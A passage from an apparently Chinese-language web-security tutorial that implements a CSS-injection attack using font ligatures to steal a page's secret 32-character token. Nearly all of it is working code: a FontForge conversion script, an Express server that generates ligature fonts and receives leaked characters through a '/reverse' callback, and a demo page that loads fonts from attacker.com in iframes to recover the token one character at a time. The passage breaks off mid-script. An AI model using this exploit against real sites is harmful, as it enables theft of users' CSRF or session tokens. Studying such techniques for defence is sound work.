字体的产生</h4><p>我们在 9.3.4 中展示的示例仅能在 Safari 浏览器中起作用，<br>这是因为仅有 Safari 支持 SVG font，不需要从 server 中产生字体，<br>而对于其他的浏览器，我们需要在 server 端来产生连字字体</p><p>借助 Fontforge 等软件，我们可以在字体中创建自己的字体以及我们自己的连字。</p><blockquote><p>Fontforge 是一种用于创建字体的高级工具，我们将使用它来将字体从 SVG 格式更改为 WOFF 。这是必要的，因为浏览器已经停止支持字体中的SVG格式（因此需要使用WOFF格式），而从我们的角度来看，以SVG格式定义字体是迄今为止最方便的。FontForge 允许您定义脚本以执行不同字体格式之间的转换。</p></blockquote><p>让我们准备一个名为 script.fontforge 的文件，其中包含以下内容：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/fontforge</span>Open<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">)</span>Generate<span class="token punctuation">(</span><span class="token variable">$1</span>:r + <span class="token string">".woff"</span><span class="token punctuation">)</span></code></pre><p>触发该脚本后，该脚本将创建一个名为 <code>&lt;file&gt;.woff</code> 的文件。<br>通过这种简单的方式，我们以字体格式创建了一个简单的转换器。</p><p>接下来我们使用 node.js 配置字体生成 server：</p><p>package.json：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"css-attack-2"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"index.js"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.15.5"</span><span class="token punctuation">,</span>    <span class="token property">"js-cookie"</span><span class="token operator">:</span> <span class="token string">"^2.1.4"</span><span class="token punctuation">,</span>    <span class="token property">"js2xmlparser"</span><span class="token operator">:</span> <span class="token string">"^3.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"rimraf"</span><span class="token operator">:</span> <span class="token string">"^2.6.2"</span><span class="token punctuation">,</span>    <span class="token property">"tmp"</span><span class="token operator">:</span> <span class="token string">"0.0.33"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>main.js：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Server ExprssJS by default adds ETag headline,</span><span class="token comment">// but we don’t need it so we turn it off.</span>app<span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token string">'etag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3001</span><span class="token punctuation">;</span><span class="token keyword">const</span> js2xmlparser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'js2xmlparser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> tmp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'tmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> rimraf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'rimraf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Generate a font for a given prefix </span><span class="token comment">// and the characters for which the ligature is to be created</span><span class="token keyword">function</span> <span class="token function">createFont</span><span class="token punctuation">(</span><span class="token parameter">prefix<span class="token punctuation">,</span> charsToLigature</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> font <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"defs"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"font"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"hack"</span><span class="token punctuation">,</span>                    <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"0"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token string-property property">"font-face"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token string-property property">"font-family"</span><span class="token operator">:</span> <span class="token string">"hack"</span><span class="token punctuation">,</span>                        <span class="token string-property property">"units-per-em"</span><span class="token operator">:</span> <span class="token string">"1000"</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token string-property property">"glyph"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// By default all possible characters have a zero width...</span>    <span class="token keyword">let</span> glyphs <span class="token operator">=</span> font<span class="token punctuation">.</span>defs<span class="token punctuation">.</span>font<span class="token punctuation">.</span>glyph<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span> c <span class="token operator">&lt;=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span> c <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> glyph <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"unicode"</span><span class="token operator">:</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>                <span class="token string-property property">"d"</span><span class="token operator">:</span> <span class="token string">"M1 0z"</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        glyphs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glyph<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// ... except ligatures, which are EXTREMELY wide.</span>    charsToLigature<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> glyph <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"@"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"unicode"</span><span class="token operator">:</span> prefix <span class="token operator">+</span> c<span class="token punctuation">,</span>                <span class="token string-property property">"horiz-adv-x"</span><span class="token operator">:</span> <span class="token string">"10000"</span><span class="token punctuation">,</span>                <span class="token string-property property">"d"</span><span class="token operator">:</span> <span class="token string">"M1 0z"</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        glyphs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glyph<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// We convert JSON-a to SVG.</span>    <span class="token keyword">const</span> xml <span class="token operator">=</span> js2xmlparser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"svg"</span><span class="token punctuation">,</span> font<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// And next we use fontforge</span>    <span class="token comment">// to change SVG to WOFF.</span>    <span class="token keyword">const</span> tmpobj <span class="token operator">=</span> tmp<span class="token punctuation">.</span><span class="token function">dirSync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/font.svg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> xml<span class="token punctuation">)</span><span class="token punctuation">;</span>    child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">"/usr/bin/fontforge"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>__dirname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/script.fontforge</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>        <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/font.svg</span><span class="token template-punctuation string">`</span></span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">const</span> woff <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tmpobj<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/font.woff</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// We delete temporary directory.</span>    rimraf<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span>tmpobj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// and we give back font in the form of WOFF.</span>    <span class="token keyword">return</span> woff<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// Endpoint for generating fonts.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/font/:prefix/:charsToLigature"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> prefix<span class="token punctuation">,</span> charsToLigature <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>        <span class="token comment">// We make sure that the font is in the cache.</span>    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string-property property">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'public, max-age=600'</span><span class="token punctuation">,</span>        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/font-woff'</span><span class="token punctuation">,</span>        <span class="token string-property property">'Access-Control-Allow-Origin'</span><span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">createFont</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>charsToLigature<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Endpoint to accept characters via a callback connection</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/reverse/:chars"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'chars'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">chars=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>chars<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">; Path=/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/cookie.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'js.cookie.js'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token string">'./node_modules/js-cookie/src/'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token string">'.'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">...</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>demo.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>utf-8</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>cookie.js</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>token</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token constant">EXPECTED_TOKEN_LENGTH</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token constant">ALPHABET</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token punctuation">;</span>        <span class="token comment">// 显示已读取的令牌</span>        <span class="token keyword">const</span> outputElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 存储已提取的令牌</span>        <span class="token keyword">let</span> extractedToken <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>                <span class="token comment">// 存储用于创建连字的前缀</span>        <span class="token keyword">let</span> prefix <span class="token operator">=</span> <span class="token string">'"'</span><span class="token punctuation">;</span>                <span class="token comment">// 泄露另一个标记字符，直到泄露所有字符</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>extractedToken<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token constant">EXPECTED_TOKEN_LENGTH</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> nextTokenChar <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getNextTokenCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            extractedToken <span class="token operator">+=</span> nextTokenChar<span class="token punctuation">;</span>                        <span class="token comment">// 将取出的标志添加到前缀中用于进一步的连字</span>            prefix <span class="token operator">+=</span> nextTokenChar<span class="token punctuation">;</span>                        <span class="token comment">// 在页面上显示目前为止我们已经提取出的 token 部分</span>            outputElement<span class="token punctuation">.</span>textContent <span class="token operator">=</span> extractedToken<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 当运行到这里时，我们已经拥有了完整的 token</span>        <span class="token comment">// 删除所有 iframe 并将 token 以粗体显示</span>        <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outputElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontWeight <span class="token operator">=</span> <span class="token string">'bold'</span><span class="token punctuation">;</span>                <span class="token comment">// 使用分治的方法提取下一个标记字符的函数</span>        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNextTokenCharacter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 出于性能目的 - 删除所有现有的 iframe 元素</span>            <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">let</span> alphabet <span class="token operator">=</span> <span class="token constant">ALPHABET</span><span class="token punctuation">;</span>            <span class="token comment">//下一个标记字符是什么。</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 等待创建一个新的 cookie - 所以首先让我们删除所有现有的 cookie</span>                <span class="token function">clearAllCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">const</span> <span class="token punctuation">[</span>leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">split</span><span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 首先，我们确保两组连字的字体都在缓存中</span>                <span class="token keyword">await</span> <span class="token function">makeSureFontsAreCached</span><span class="token punctuation">(</span>leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 此处人为延迟会减少的攻击逃逸的可能性</span>                <span class="token keyword">await</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 然后我们使用“攻击”CSS 创建两个 iframe</span>                <span class="token keyword">await</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">createAttackIframe</span><span class="token punctuation">(</span>leftChars<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">createAttackIframe</span><span class="token punctuation">(</span>rightChars<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 等待返回的字符</span>                <span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getCharsFromReverseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 在此基础上我们继续“分而治之”。</span>                alphabet <span class="token operator">=</span> chars<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//如果我们在这里，那就意味着字母表有一个字符。</span>            <span class="token comment">//结论：这个字符是另一个 token 字符</span>                        <span class="token keyword">return</span> alphabet<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">function</span> <span class="token function">clearAllCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">cookie</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                Cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">function</span> <span class="token function">deleteAllIframes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">iframe</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                iframe<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">// 该函数将字符串分成两个长度相同（或相差一）的字符串。例如 split("abcd") == ["ab", "cd"];</span>        <span class="token keyword">function</span> <span class="token function">split</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> halfLength <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> halfLength<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>halfLength<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">// 生成随机字符串的函数，例如 randomValue() == "rand6226966173982633"</span>        <span class="token keyword">function</span> <span class="token function">randomValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"rand"</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">//我们生成 CSS，这将确保字体位于缓存中。</span>        <span class="token comment">//作为字体已经下载的证明，我们将使用以下检查</span>        <span class="token comment">//是否定义了 font_$&#123;random_track_characters&#125; cookie。</span>        <span class="token keyword">function</span> <span class="token function">makeSureFontsAreCached</span><span class="token punctuation">(</span><span class="token parameter">leftChars<span class="token punctuation">,</span> rightChars</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 我们对所有值进行编码，以便能够将它们安全地放置在 URL 中。</span>                <span class="token keyword">let</span> encodedPrefix<span class="token punctuation">;</span>                <span class="token punctuation">[</span>encodedPrefix<span class="token punctuation">,</span> leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>prefix<span class="token punctuation">,</span> leftChars<span class="token punctuation">,</span> rightChars<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=></span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">// 我们生成引用这两种字体的 CSS。使用 body:before 和 body:after 以确保浏览器必须下载这两种字体。</span>                <span class="token keyword">const</span> css <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                    @font-face &#123;                        font-family: 'hack1';                        src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>encodedPrefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>leftChars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)                    &#125;                    @font-face &#123;                        font-family: 'hack2';                        src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>encodedPrefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>rightChars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)                    &#125;                    body:before &#123;                        content: 'x';                        font-family: 'hack1';                    &#125;                    body:after &#123;                        content: 'x';                        font-family: 'hack2';                    &#125;                </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>                                <span class="token comment">// 创建一个将加载字体的 iframe</span>                <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// 该函数直到发生事件才会结束</span>                    <span class="token 